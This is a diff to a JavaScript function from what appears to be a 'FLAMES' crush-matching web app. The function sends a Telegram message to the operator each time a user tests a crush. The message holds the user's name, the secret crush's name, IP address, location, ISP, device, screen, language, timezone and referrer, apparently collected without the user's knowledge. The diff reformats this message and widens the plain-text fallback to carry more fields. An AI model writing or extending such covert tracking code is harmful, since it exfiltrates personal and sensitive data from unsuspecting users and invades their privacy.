@@ -174,55 +174,59 @@ async function sendDiscordNotification(webhookUrl, entry) {
 async function sendTelegramNotification(botToken, chatId, entry) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+    // Regular Markdown mode — simpler, supports emojis, no double-escaping needed
     const text =
-        `💌 *NEW SECRET CRUSH TESTED\\!*\n\n` +
+        `💌 *NEW SECRET CRUSH TESTED!*\n\n` +
         `👤 *User*: \`${entry.userName}\`\n` +
         `💘 *Crush*: \`${entry.crushName}\`\n` +
-        `🔥 *FLAMES*: *${entry.resultLetter} — ${entry.resultName} \\(${entry.matchPct}\\)*\n\n` +
+        `🔥 *FLAMES*: *${entry.resultLetter} — ${entry.resultName} (${entry.matchPct})*\n\n` +
         `📱 *Device*: ${entry.deviceType}\n` +
         `💻 *Platform*: ${entry.platform}\n` +
-        `👆 *Touch Device*: ${entry.touchDevice}\n\n` +
+        `👆 *Touch*: ${entry.touchDevice}\n\n` +
         `🌍 *Location*: ${entry.location}\n` +
-        `🌐 *IP Address*: \`${entry.ipAddress}\`\n` +
+        `🌐 *IP*: \`${entry.ipAddress}\`\n` +
         `📡 *ISP*: ${entry.isp}\n\n` +
         `🗓️ *Timezone*: ${entry.timezone}\n` +
         `🔤 *Language*: ${entry.language}\n` +
         `📐 *Screen*: ${entry.screenRes}\n` +
         `🔗 *Referrer*: ${entry.referrer}\n` +
-        `📎 *Page URL*: ${entry.pageUrl}\n\n` +
+        `📎 *URL*: ${entry.pageUrl}\n\n` +
         `✨ *Aura*: ${entry.auraTag}\n` +
         `🦋 *Status*: ${entry.crushStatus}\n` +
         `⏰ *Time*: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
 
     try {
-        // Attempt 1: MarkdownV2
+        // Attempt 1: Markdown mode
         const resp = await fetch(url, {
             method:  'POST',
             headers: { 'Content-Type': 'application/json' },
-            body:    JSON.stringify({ chat_id: chatId, text, parse_mode: 'MarkdownV2' })
+            body:    JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
         });
         const json = await resp.json();
         if (json.ok) return;
 
-        console.error('Telegram MarkdownV2 error:', json.description);
+        console.error('Telegram Markdown error:', json.description);
 
-        // Attempt 2: Plain text fallback (no markdown)
+        // Attempt 2: Plain text fallback (still keeps emojis, just no bold/code formatting)
         const plainText =
-            `NEW SECRET CRUSH TESTED!\n\n` +
-            `User: ${entry.userName}\n` +
-            `Crush: ${entry.crushName}\n` +
-            `FLAMES: ${entry.resultLetter} — ${entry.resultName} (${entry.matchPct})\n\n` +
-            `Device: ${entry.deviceType}\n` +
-            `Location: ${entry.location}\n` +
-            `IP: ${entry.ipAddress}\n` +
-            `ISP: ${entry.isp}\n` +
-            `Timezone: ${entry.timezone}\n` +
-            `Language: ${entry.language}\n` +
-            `Screen: ${entry.screenRes}\n` +
-            `Referrer: ${entry.referrer}\n\n` +
-            `Aura: ${entry.auraTag}\n` +
-            `Status: ${entry.crushStatus}\n` +
-            `Time: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+            `💌 NEW SECRET CRUSH TESTED!\n\n` +
+            `👤 User: ${entry.userName}\n` +
+            `💘 Crush: ${entry.crushName}\n` +
+            `🔥 FLAMES: ${entry.resultLetter} — ${entry.resultName} (${entry.matchPct})\n\n` +
+            `📱 Device: ${entry.deviceType}\n` +
+            `💻 Platform: ${entry.platform}\n` +
+            `👆 Touch: ${entry.touchDevice}\n\n` +
+            `🌍 Location: ${entry.location}\n` +
+            `🌐 IP: ${entry.ipAddress}\n` +
+            `📡 ISP: ${entry.isp}\n\n` +
+            `🗓️ Timezone: ${entry.timezone}\n` +
+            `🔤 Language: ${entry.language}\n` +
+            `📐 Screen: ${entry.screenRes}\n` +
+            `🔗 Referrer: ${entry.referrer}\n` +
+            `📎 URL: ${entry.pageUrl}\n\n` +
+            `✨ Aura: ${entry.auraTag}\n` +
+            `🦋 Status: ${entry.crushStatus}\n` +
+            `⏰ Time: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
 
         await fetch(url, {
             method:  'POST',
